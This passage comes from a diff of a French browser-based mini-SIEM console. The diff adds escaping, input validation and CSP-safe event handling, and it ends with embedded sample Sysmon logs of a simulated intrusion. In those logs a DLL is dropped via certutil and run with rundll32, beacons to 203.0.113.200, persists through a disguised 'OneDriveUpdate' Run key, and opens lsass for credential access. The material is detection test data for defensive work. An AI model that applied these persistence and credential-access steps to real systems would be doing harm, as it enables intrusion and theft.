SystemTime=\"2026-11-08T14:05:52.3580000Z\"/><EventRecordID>52031</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:05:52.358</Data><Data Name=\"ProcessId\">9797</Data><Data Name=\"Image\">C:\\Windows\\System32\\certutil.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"TargetFilename\">C:\\Users\\mmartin\\AppData\\Local\\Temp\\upd.dll</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>1</EventID><TimeCreated SystemTime=\"2026-11-08T14:06:05.6190000Z\"/><EventRecordID>52032</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:06:05.619</Data><Data Name=\"ProcessId\">9555</Data><Data Name=\"Image\">C:\\Windows\\System32\\rundll32.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"CommandLine\">rundll32.exe C:\\Users\\mmartin\\AppData\\Local\\Temp\\upd.dll,Start</Data><Data Name=\"CurrentDirectory\">C:\\Users\\mmartin\\</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"ParentProcessId\">5970</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T14:06:07.9260000Z\"/><EventRecordID>52033</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:06:07.926</Data><Data Name=\"ProcessId\">9555</Data><Data Name=\"Image\">C:\\Windows\\System32\\rundll32.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">62673</Data><Data Name=\"DestinationIp\">203.0.113.200</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T14:07:08.9260000Z\"/><EventRecordID>52034</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:07:08.926</Data><Data Name=\"ProcessId\">9555</Data><Data Name=\"Image\">C:\\Windows\\System32\\rundll32.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">63049</Data><Data Name=\"DestinationIp\">203.0.113.200</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>13</EventID><TimeCreated SystemTime=\"2026-11-08T14:07:30.9400000Z\"/><EventRecordID>52035</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:07:30.940</Data><Data Name=\"ProcessId\">9555</Data><Data Name=\"Image\">C:\\Windows\\System32\\rundll32.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"EventType\">SetValue</Data><Data Name=\"TargetObject\">HKU\\S-1-5-21-3623811015-3361044348-30300820-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate</Data><Data Name=\"Details\">rundll32.exe C:\\Users\\mmartin\\AppData\\Local\\Temp\\upd.dll,Start</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T14:08:10.9260000Z\"/><EventRecordID>52036</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:08:10.926</Data><Data Name=\"ProcessId\">9555</Data><Data Name=\"Image\">C:\\Windows\\System32\\rundll32.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">57904</Data><Data Name=\"DestinationIp\">203.0.113.200</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>10</EventID><TimeCreated SystemTime=\"2026-11-08T14:09:12.8750000Z\"/><EventRecordID>52037</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:09:12.875</Data><Data Name=\"SourceProcessId\">9555</Data><Data Name=\"SourceImage\">C:\\Windows\\System32\\rundll32.exe</Data><Data Name=\"TargetProcessId\">8086</Data><Data Name=\"TargetImage\">C:\\Windows\\System32\\lsass.exe</Data><Data Name=\"GrantedAccess\">0x1010</Data><Data Name=\"SourceUser\">CORP\\mmartin</Data><Data Name=\"TargetUser\">NT AUTHORITY\\SYSTEM</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T14:09:12.9260000Z\"/><EventRecordID>52038</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:09:12.926</Data><Data Name=\"ProcessId\">9555</Data><Data Name=\"Image\">C:\\Windows\\System32\\rundll32.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">57395</Data><Data Name=\"DestinationIp\">203.0.113.200</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T14:10:10.9260000Z\"/><EventRecordID>52039</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:10:10.926</Data><Data Name=\"ProcessId\">9555</Data><Data Name=\"Image\">C:\\Windows\\System32\\rundll32.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">54100</Data><Data Name=\"DestinationIp\">203.0.113.200</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n"};
 })(typeof window !== 'undefined' ? window : globalThis);
 
 </script>
@@ -738,6 +998,12 @@
 <script>
 /* mini-SIEM — console SOC (logique front).
  * S'appuie sur le moteur partagé window.MiniSIEM. Tout est côté client.
+ *
+ * Sécurité : la page est servie sous une CSP stricte (script-src 'self',
+ * style-src 'self'). Aucun gestionnaire d'événement ni style dans le HTML :
+ * les clics passent par des attributs data-action et un écouteur unique.
+ * Toute donnée affichée (journaux chargés, règles et statuts relus depuis
+ * localStorage) est échappée, guillemets compris, avant d'entrer dans le DOM.
  */
 (function () {
   "use strict";
@@ -745,6 +1011,7 @@
   const DEFAULT_RULES = window.MINISIEM_RULES;
   const CTI = M.ctiIndex(window.MINISIEM_CTI);
   const SEV = M.SEVERITY_ORDER;
+  const SEVS = ["critical", "high", "medium", "low"];
   const IR_KEY = "minisiem_ir_v1", RULES_KEY = "minisiem_rules_v1";
 
   const STATUS = {
@@ -761,6 +1028,8 @@
     collect_evidence: "Collecter les preuves (logs, mémoire)",
     notify: "Notifier l'équipe / ouvrir un ticket",
   };
+  const SAMPLE_NAMES = {auth: "Exemple SSH", web: "Exemple web", fw: "Exemple pare-feu",
+                        win: "Exemple Windows", sysmon: "Exemple Sysmon"};
 
   const store = {
     get(k, def) { try { return JSON.parse(localStorage.getItem(k)) || def; } catch (e) { return def; } },
@@ -769,29 +1038,57 @@
 
   const state = {
     events: [], alerts: [], srcLabel: "",
-    rules: store.get(RULES_KEY, null) || clone(DEFAULT_RULES),
+    rules: validRules(store.get(RULES_KEY, null)) || clone(DEFAULT_RULES),
     ir: store.get(IR_KEY, {}),
     currentRuleId: null,
   };
+  if (!state.ir || typeof state.ir !== "object" || Array.isArray(state.ir)) state.ir = {};
 
   const els = {};
-  ["file", "srcInfo", "kpis", "rows", "search", "openOnly", "ruleList", "ruleCount",
+  ["file", "srcInfo", "kpis", "rows", "search", "filters", "openOnly", "ruleList", "ruleCount",
    "editor", "editHint", "editTitle", "e_id", "e_title", "e_type", "e_level",
    "e_attack", "e_tactic", "e_params", "e_err", "e_effect", "drawer"]
     .forEach(id => els[id] = document.getElementById(id));
-  window.els = els;
 
+  // --- Utilitaires --------------------------------------------------------
   function clone(o) { return JSON.parse(JSON.stringify(o)); }
-  function esc(s) { return String(s == null ? "" : s).replace(/[&<>]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;"}[c])); }
+  function validRules(r) {
+    return Array.isArray(r) && r.every(x => x && typeof x === "object" && typeof x.id === "string") ? r : null;
+  }
+  const ESC = {"&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"};
+  function esc(s) { return String(s == null ? "" : s).replace(/[&<>"']/g, c => ESC[c]); }
+  function sev(s) { return SEVS.indexOf(s) >= 0 ? s : "low"; }
+  function num(n) { n = Number(n); return isFinite(n) ? n : 0; }
   function fp(a) { return [a.rule_id, a.source_ip || "", a.user || "", +new Date(a.first_seen)].join("|"); }
-  function irOf(a) { return state.ir[fp(a)] || {status: "nouveau", assignee: "", notes: "", actions: {}}; }
+  function irOf(a) {
+    const r = state.ir[fp(a)];
+    const rec = r && typeof r === "object" ? r : {};
+    return {status: STATUS[rec.status] ? rec.status : "nouveau",
+            assignee: rec.assignee || "", notes: rec.notes || "",
+            actions: rec.actions && typeof rec.actions === "object" ? rec.actions : {}};
+  }
   function setIr(a, rec) { state.ir[fp(a)] = rec; store.set(IR_KEY, state.ir); }
-  function fmt(d) { return new Date(d).toLocaleString("fr-FR"); }
+  function fmt(d) { const x = new Date(d); return isNaN(x) ? "-" : x.toLocaleString("fr-FR"); }
+  function base(p) { return p ? String(p).split(/[\\/]/).pop() : ""; }
+  function clip(s, n) { s = String(s || ""); return s.length > n ? s.slice(0, n - 1) + "…" : s; }
 
   function download(name, text, type) {
     const b = new Blob([text], {type: type || "application/json"});
     const u = URL.createObjectURL(b), a = document.createElement("a");
     a.href = u; a.download = name; a.click(); setTimeout(() => URL.revokeObjectURL(u), 500);
+  }
+
+  // Résumé lisible d'un événement, selon sa source (colonne « Détail »)
+  function detailOf(e) {
+    switch (e.event_type) {
+      case "process_creation": return e.command_line || base(e.process);
+      case "network_connection": return `${base(e.process)} → ${e.dest_ip || "?"}:${e.dest_port || "?"}`;
+      case "process_access": return `${base(e.process)} → ${base(e.target)} (${e.granted_access || "?"})`;
+      case "file_event": case "registry_set": case "dns_query": return `${base(e.process)} → ${e.target || ""}`;
+      case "web_request": return `${e.method || ""} ${e.url || ""} → ${e.status || ""}`;
+      case "fw_block": return `${e.proto || ""} port ${e.dest_port || "?"}`;
+      default: return e.event_id ? `EventID ${e.event_id}${e.detail ? " · " + e.detail : ""}` : "";
+    }
   }
 
   // --- Détection ----------------------------------------------------------
@@ -801,116 +1098,125 @@
     alerts = alerts.concat(M.ctiDetectContacts(CTI, ev, alerts));
     M.ctiEnrich(alerts, CTI);
     M.enrich(alerts);
-    alerts.sort((a, b) => (SEV[a.severity] - SEV[b.severity]) || (new Date(a.first_seen) - new Date(b.first_seen)));
+    const rank = s => (s in SEV ? SEV[s] : 9);
+    alerts.sort((a, b) => (rank(a.severity) - rank(b.severity)) ||
+                          (new Date(a.first_seen) - new Date(b.first_seen)));
     state.alerts = alerts;
     renderKPIs(); renderAlerts();
   }
 
   function renderKPIs() {
     const c = {critical: 0, high: 0, medium: 0, low: 0};
-    state.alerts.forEach(a => c[a.severity]++);
+    state.alerts.forEach(a => c[sev(a.severity)]++);
     const open = state.alerts.filter(a => { const s = irOf(a).status; return s !== "resolu" && s !== "fauxpositif"; }).length;
     els.kpis.innerHTML =
       kpi(state.events.length, "Événements") + kpi(state.alerts.length, "Alertes") +
-      kpi(open, "Non résolues") +
-      ["critical","high","medium","low"].map(s => kpi(c[s], s, `var(--${s})`)).join("");
+      kpi(open, "Non résolues") + SEVS.map(s => kpi(c[s], s, "c-" + s)).join("");
   }
-  function kpi(n, l, col) {
-    return `<div class="kpi"><div class="n"${col?` style="color:${col}"`:""}>${n}</div><div class="l">${l}</div></div>`;
+  function kpi(n, l, cls) {
+    return `<div class="kpi"><div class="n${cls ? " " + cls : ""}">${num(n)}</div><div class="l">${esc(l)}</div></div>`;
   }
+
+  function emptyRow(text) { return `<tr><td colspan="7" class="meta empty">${esc(text)}</td></tr>`; }
 
   function renderAlerts() {
     const q = (els.search.value || "").toLowerCase();
     const sevs = Array.from(document.querySelectorAll(".sevf:checked")).map(c => c.value);
     const openOnly = els.openOnly.checked;
+    if (!state.alerts.length) { els.rows.innerHTML = emptyRow("Charge une source pour lancer la détection."); return; }
     const rows = state.alerts.filter(a => {
-      if (sevs.indexOf(a.severity) < 0) return false;
+      if (sevs.indexOf(sev(a.severity)) < 0) return false;
       if (openOnly) { const s = irOf(a).status; if (s === "resolu" || s === "fauxpositif") return false; }
       if (q) { const hay = [a.rule_id, a.title, a.source_ip, a.user, a.attack].join(" ").toLowerCase();
                if (hay.indexOf(q) < 0) return false; }
       return true;
     });
-    if (!state.alerts.length) { els.rows.innerHTML = `<tr><td colspan="7" class="meta" style="padding:20px">Charge une source pour lancer la détection.</td></tr>`; return; }
-    els.rows.innerHTML = rows.length ? rows.map((a, i) => {
-      const rec = irOf(a), st = STATUS[rec.status];
-      return `<tr onclick="App.open(${state.alerts.indexOf(a)})">
-        <td><span class="sev ${a.severity}">${a.severity}</span></td>
-        <td><span class="st ${st.cls}">${st.label}</span></td>
-        <td>${esc(a.title)}${a.threat?` <span class="cti">connu</span>`:""}</td>
-        <td>${a.source_ip?`<code>${esc(a.source_ip)}</code>`:"-"}${a.country?`<br><span class="meta">${esc(a.country)}</span>`:""}</td>
-        <td>${esc(a.user)||"-"}</td><td>${a.count}</td>
+    els.rows.innerHTML = rows.length ? rows.map(a => {
+      const st = STATUS[irOf(a).status], s = sev(a.severity);
+      return `<tr data-action="open" data-idx="${state.alerts.indexOf(a)}" tabindex="0">
+        <td><span class="sev ${s}">${s}</span></td>
+        <td><span class="st ${st.cls}">${esc(st.label)}</span></td>
+        <td>${esc(a.title)}${a.threat ? ` <span class="cti">connu</span>` : ""}</td>
+        <td>${a.source_ip ? `<code>${esc(a.source_ip)}</code>` : "-"}${a.country ? `<br><span class="meta">${esc(a.country)}</span>` : ""}</td>
+        <td>${esc(a.user) || "-"}</td><td>${num(a.count)}</td>
         <td><span class="att">${esc(a.attack)}</span></td></tr>`;
-    }).join("") : `<tr><td colspan="7" class="meta" style="padding:20px">Aucune alerte pour ces filtres.</td></tr>`;
+    }).join("") : emptyRow("Aucune alerte pour ces filtres.");
   }
 
   // --- Investigation + réponse à incident (drawer) ------------------------
   function openDrawer(idx) {
     const a = state.alerts[idx];
-    const rec = irOf(a);
+    if (!a) return;
+    const rec = irOf(a), s = sev(a.severity);
     const rule = state.rules.find(r => r.id === a.rule_id);
     // Activité liée : mêmes IP ou compte
     const related = state.events.filter(e =>
-      (a.source_ip && e.source_ip === a.source_ip) || (a.user && e.user === a.user))
+      (a.source_ip && (e.source_ip === a.source_ip || e.dest_ip === a.source_ip)) ||
+      (a.user && e.user === a.user))
       .sort((x, y) => new Date(x.timestamp) - new Date(y.timestamp));
     // Chaîne ATT&CK de l'entité
     const chain = state.alerts.filter(x =>
       (a.source_ip && x.source_ip === a.source_ip) || (a.user && x.user === a.user))
       .sort((x, y) => new Date(x.first_seen) - new Date(y.first_seen));
+    const evidence = Array.isArray(a.evidence) ? a.evidence : [];
 
-    els.drawer.innerHTML = `<div class="drawer-bg" onclick="if(event.target===this)App.closeDrawer()">
-      <div class="drawer">
-        <span class="close" onclick="App.closeDrawer()">&times;</span>
-        <h2>${esc(a.title)}</h2>
-        <div class="row"><span class="sev ${a.severity}">${a.severity}</span>
+    els.drawer.innerHTML = `<div class="drawer-bg">
+      <div class="drawer" role="dialog" aria-modal="true" aria-labelledby="drawerTitle">
+        <button class="close" data-action="close-drawer" aria-label="Fermer">&times;</button>
+        <h2 id="drawerTitle">${esc(a.title)}</h2>
+        <div class="row"><span class="sev ${s}">${s}</span>
           <span class="att">${esc(a.attack)}</span><span class="meta">${esc(a.tactic)}</span></div>
-        <p class="meta">${esc(a.description||"")}</p>
+        <p class="meta">${esc(a.description || "")}</p>
         <div class="row meta">
-          <span>Source : ${a.source_ip?`<code>${esc(a.source_ip)}</code>`:"-"}
-            ${a.country?`· ${esc(a.country)}${a.city?" ("+esc(a.city)+")":""}`:""}</span>
-          <span>Compte : ${esc(a.user)||"-"}</span>
-          <span>${a.count} occurrence(s)</span>
-          <span>${fmt(a.first_seen)} → ${fmt(a.last_seen)}</span>
+          <span>Source : ${a.source_ip ? `<code>${esc(a.source_ip)}</code>` : "-"}
+            ${a.country ? `· ${esc(a.country)}${a.city ? " (" + esc(a.city) + ")" : ""}` : ""}</span>
+          <span>Compte : ${esc(a.user) || "-"}</span>
+          <span>${num(a.count)} occurrence(s)</span>
+          <span>${esc(fmt(a.first_seen))} → ${esc(fmt(a.last_seen))}</span>
         </div>
-        ${a.threat?`<p><span class="cti">⚠ Renseignement : connu de ${esc(a.threat.source)}
-          — ${esc(a.threat.category)}, confiance ${a.threat.confidence}%</span></p>`:""}
+        ${a.threat ? `<p><span class="cti">⚠ Renseignement : connu de ${esc(a.threat.source)}
+          — ${esc(a.threat.category)}, confiance ${num(a.threat.confidence)}%</span></p>` : ""}
 
         <h3>Réponse à incident</h3>
         <div class="row">
-          <select id="ir_status">${Object.keys(STATUS).map(k =>
-            `<option value="${k}"${rec.status===k?" selected":""}>${STATUS[k].label}</option>`).join("")}</select>
-          <input id="ir_assignee" placeholder="Assigné à" value="${esc(rec.assignee)}" style="flex:1">
+          <select id="ir_status" aria-label="Statut">${Object.keys(STATUS).map(k =>
+            `<option value="${k}"${rec.status === k ? " selected" : ""}>${esc(STATUS[k].label)}</option>`).join("")}</select>
+          <input id="ir_assignee" class="grow" placeholder="Assigné à" aria-label="Assigné à" value="${esc(rec.assignee)}">
         </div>
-        <div style="margin:6px 0">${Object.keys(ACTIONS).map(k =>
-          `<label class="chk"><input type="checkbox" id="ir_act_${k}"${rec.actions&&rec.actions[k]?" checked":""}> ${ACTIONS[k]}</label>`).join("")}</div>
-        <textarea id="ir_notes" rows="3" placeholder="Notes d'investigation...">${esc(rec.notes)}</textarea>
-        <div class="row" style="margin-top:8px"><button class="primary" onclick="App.saveIr(${idx})">Enregistrer</button>
+        <div class="acts">${Object.keys(ACTIONS).map(k =>
+          `<label class="chk"><input type="checkbox" id="ir_act_${k}"${rec.actions[k] ? " checked" : ""}> ${esc(ACTIONS[k])}</label>`).join("")}</div>
+        <textarea id="ir_notes" rows="3" placeholder="Notes d'investigation..." aria-label="Notes">${esc(rec.notes)}</textarea>
+        <div class="row mt8"><button class="primary" data-action="save-ir" data-idx="${num(idx)}">Enregistrer</button>
           <span class="meta" id="ir_saved"></span></div>
 
         <h3>Chaîne ATT&amp;CK de l'entité (${chain.length} alerte(s))</h3>
-        <table><tbody>${chain.map(x =>
-          `<tr><td><span class="sev ${x.severity}">${x.severity}</span></td>
+        <div class="tablewrap"><table><tbody>${chain.map(x =>
+          `<tr class="static"><td><span class="sev ${sev(x.severity)}">${sev(x.severity)}</span></td>
             <td>${esc(x.title)}</td><td><span class="att">${esc(x.attack)}</span></td>
-            <td class="meta">${esc(x.tactic)}</td></tr>`).join("")}</tbody></table>
+            <td class="meta">${esc(x.tactic)}</td></tr>`).join("")}</tbody></table></div>
 
         <h3>Activité liée (${related.length} événement(s))</h3>
-        <table><thead><tr><th>Heure</th><th>Source</th><th>Type</th><th>Issue</th></tr></thead>
+        <div class="tablewrap"><table><thead><tr><th>Heure</th><th>Source</th><th>Type</th><th>Détail</th></tr></thead>
           <tbody>${related.slice(0, 60).map(e =>
-            `<tr style="cursor:default"><td class="meta">${fmt(e.timestamp)}</td>
-              <td class="meta">${esc(e.source)}</td><td>${esc(e.event_type)}</td>
-              <td>${esc(e.outcome)}</td></tr>`).join("")}</tbody></table>
-        ${related.length>60?`<p class="meta">… ${related.length-60} de plus</p>`:""}
+            `<tr class="static"><td class="meta">${esc(fmt(e.timestamp))}</td>
+              <td class="meta">${esc(e.source)}</td><td>${esc(e.event_type)}<br><span class="meta">${esc(e.outcome)}</span></td>
+              <td class="det">${esc(clip(detailOf(e), 160))}</td></tr>`).join("")}</tbody></table></div>
+        ${related.length > 60 ? `<p class="meta">… ${related.length - 60} de plus</p>` : ""}
 
-        <h3>Preuves (${a.evidence.length})</h3>
-        <pre>${esc(a.evidence.join("\n"))}</pre>
+        <h3>Preuves (${evidence.length})</h3>
+        <pre>${esc(evidence.join("\n"))}</pre>
 
         <h3>Règle déclenchée</h3>
-        <pre>${esc(JSON.stringify(rule||{id:a.rule_id,note:"règle interne (CTI)"}, null, 2))}</pre>
+        <pre>${esc(JSON.stringify(rule || {id: a.rule_id, note: "règle interne (CTI)"}, null, 2))}</pre>
       </div></div>`;
+    const close = els.drawer.querySelector(".close");
+    if (close) close.focus();
   }
   function closeDrawer() { els.drawer.innerHTML = ""; }
 
   function saveIr(idx) {
     const a = state.alerts[idx];
+    if (!a) return;
     const actions = {};
     Object.keys(ACTIONS).forEach(k => { const el = document.getElementById("ir_act_" + k); if (el && el.checked) actions[k] = true; });
     setIr(a, {status: document.getElementById("ir_status").value,
@@ -921,14 +1227,14 @@
   }
 
   function exportIncident() {
-    if (!state.alerts.length) { alert("Charge d'abord une source."); return; }
+    if (!state.alerts.length) { window.alert("Charge d'abord une source."); return; }
     const data = state.alerts.map(a => {
       const rec = irOf(a);
       return {rule_id: a.rule_id, title: a.title, severity: a.severity, attack: a.attack,
               tactic: a.tactic, source_ip: a.source_ip, user: a.user, count: a.count,
               first_seen: a.first_seen, last_seen: a.last_seen, country: a.country || null,
               threat: a.threat || null, status: rec.status, assignee: rec.assignee,
-              actions: Object.keys(rec.actions || {}), notes: rec.notes};
+              actions: Object.keys(rec.actions), notes: rec.notes};
     });
     download("rapport_incident.json", JSON.stringify(
       {generated_at: new Date().toISOString(), source: state.srcLabel,
@@ -945,10 +1251,10 @@
   function renderRuleList() {
     els.ruleCount.textContent = state.rules.length;
     els.ruleList.innerHTML = state.rules.map(r =>
-      `<div class="rulecard ${r.id===state.currentRuleId?"sel":""}" onclick="App.selectRule('${r.id}')">
-        <div class="row" style="margin:0; justify-content:space-between">
-          <b>${esc(r.id)}</b><span class="sev ${r.level}">${r.level}</span></div>
-        <div class="meta">${esc(r.title)} · <span class="att">${esc(r.attack||"-")}</span> · ${esc(r.type)}</div>
+      `<div class="rulecard${r.id === state.currentRuleId ? " sel" : ""}" data-action="select-rule" data-rule="${esc(r.id)}" tabindex="0">
+        <div class="row m0 between">
+          <b>${esc(r.id)}</b><span class="sev ${sev(r.level)}">${sev(r.level)}</span></div>
+        <div class="meta">${esc(r.title)} · <span class="att">${esc(r.attack || "-")}</span> · ${esc(r.type)}</div>
       </div>`).join("");
   }
 
@@ -959,7 +1265,7 @@
     els.editor.classList.remove("hidden"); els.editHint.classList.add("hidden");
     els.editTitle.textContent = "Éditeur — " + id;
     els.e_id.value = r.id; els.e_title.value = r.title || ""; els.e_type.value = r.type || "match";
-    els.e_level.value = r.level || "medium"; els.e_attack.value = r.attack || ""; els.e_tactic.value = r.tactic || "";
+    els.e_level.value = sev(r.level || "medium"); els.e_attack.value = r.attack || ""; els.e_tactic.value = r.tactic || "";
     const params = paramsOf(r);
     if (r.description) params.description = r.description;
     els.e_params.value = JSON.stringify(params, null, 2);
@@ -974,21 +1280,25 @@
     persistRules(); selectRule(id); renderRuleList();
   }
 
+  function showErr(msg) { els.e_err.textContent = msg; els.e_err.classList.remove("hidden"); }
+
   function saveRule() {
     let params;
     try { params = JSON.parse(els.e_params.value || "{}"); }
-    catch (e) { els.e_err.textContent = "JSON invalide : " + e.message; els.e_err.classList.remove("hidden"); return; }
-    if (!els.e_id.value.trim()) { els.e_err.textContent = "L'id est obligatoire."; els.e_err.classList.remove("hidden"); return; }
+    catch (e) { showErr("JSON invalide : " + e.message); return; }
+    if (!params || typeof params !== "object" || Array.isArray(params)) { showErr("Les paramètres doivent être un objet JSON."); return; }
+    if (!els.e_id.value.trim()) { showErr("L'id est obligatoire."); return; }
     els.e_err.classList.add("hidden");
     const idx = state.rules.findIndex(r => r.id === state.currentRuleId);
-    const rule = Object.assign({id: els.e_id.value.trim(), title: els.e_title.value,
+    const rule = Object.assign({}, params, {id: els.e_id.value.trim(), title: els.e_title.value,
       type: els.e_type.value, level: els.e_level.value,
-      attack: els.e_attack.value, tactic: els.e_tactic.value}, params);
+      attack: els.e_attack.value, tactic: els.e_tactic.value});
     if (idx >= 0) state.rules[idx] = rule; else state.rules.push(rule);
     state.currentRuleId = rule.id;
     persistRules();
     const before = state.alerts.length;
-    detect();
+    try { detect(); }
+    catch (e) { showErr("Règle inutilisable : " + e.message); return; }
     els.e_effect.textContent = `Règles enregistrées. Détection relancée : ${state.alerts.length} alerte(s) (était ${before}).`;
     renderRuleList();
   }
@@ -1001,7 +1311,7 @@
   }
 
   function resetRules() {
-    if (!confirm("Réinitialiser toutes les règles aux valeurs par défaut ?")) return;
+    if (!window.confirm("Réinitialiser toutes les règles aux valeurs par défaut ?")) return;
     state.rules = clone(DEFAULT_RULES); try { localStorage.removeItem(RULES_KEY); } catch (e) {}
     state.currentRuleId = null; els.editor.classList.add("hidden"); els.editHint.classList.remove("hidden");
     detect(); renderRuleList();
@@ -1018,12 +1328,12 @@
     detect();
   }
   function loadSample(key) {
-    const names = {auth: "Exemple SSH", web: "Exemple web", win: "Exemple Windows"};
-    analyzeText(window.MINISIEM_SAMPLES[key], names[key]);
+    if (!SAMPLE_NAMES[key]) return;
+    analyzeText(window.MINISIEM_SAMPLES[key], SAMPLE_NAMES[key]);
   }
   function loadAll() {
     const s = window.MINISIEM_SAMPLES;
-    analyzeText([s.auth, s.web, s.win].join("\n"), "Toutes les sources");
+    analyzeText(Object.keys(SAMPLE_NAMES).map(k => s[k]).join("\n"), "Toutes les sources");
   }
 
   // --- Navigation ---------------------------------------------------------
@@ -1034,13 +1344,41 @@
     if (name === "rules") renderRuleList();
   }
 
+  // --- Événements : un écouteur délégué, aucun onclick dans le HTML -------
+  const HANDLERS = {
+    "pick-file": () => els.file.click(),
+    "sample": t => loadSample(t.dataset.sample),
+    "load-all": loadAll,
+    "tab": t => tab(t.dataset.tab),
+    "export-incident": exportIncident,
+    "open": t => openDrawer(+t.dataset.idx),
+    "close-drawer": closeDrawer,
+    "save-ir": t => saveIr(+t.dataset.idx),
+    "new-rule": newRule,
+    "reset-rules": resetRules,
+    "export-rules": exportRules,
+    "select-rule": t => selectRule(t.dataset.rule),
+    "save-rule": saveRule,
+    "delete-rule": deleteRule,
+  };
+
+  document.addEventListener("click", e => {
+    if (e.target.classList && e.target.classList.contains("drawer-bg")) { closeDrawer(); return; }
+    const t = e.target.closest("[data-action]");
+    if (t && HANDLERS[t.dataset.action]) HANDLERS[t.dataset.action](t);
+  });
+  document.addEventListener("keydown", e => {
